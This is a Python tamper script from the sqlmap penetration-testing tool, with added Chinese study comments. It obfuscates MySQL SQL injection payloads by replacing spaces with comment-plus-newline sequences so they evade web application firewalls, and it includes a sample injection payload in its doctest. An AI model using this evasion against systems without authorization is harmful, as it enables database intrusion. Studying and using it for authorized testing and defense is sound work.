#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import random
import re
import string

from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s > 5.1.13" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')

    Requirement:
        * MySQL >= 5.1.13

    Tested against:
        * MySQL 5.1.41

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227'
    """

    def process(match):
        word = match.group('word')
        randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))

        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "%s%%23%s%%0A" % (word, randomStr))
        else:
            return match.group()

    retVal = ""

    if payload:
        payload = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, payload)

        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                ##用6到12个随机字符替换空格
                retVal += "%%23%s%%0A" % randomStr
                ##代入进去 %0A是一个换行符
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                ##如果i后被#或者--阶段
                retVal += payload[i:]
                #直接奖赏payload的切片。这里的切片就是取下i中的所有数据
                break
            else:
                retVal += payload[i]

    return retVal
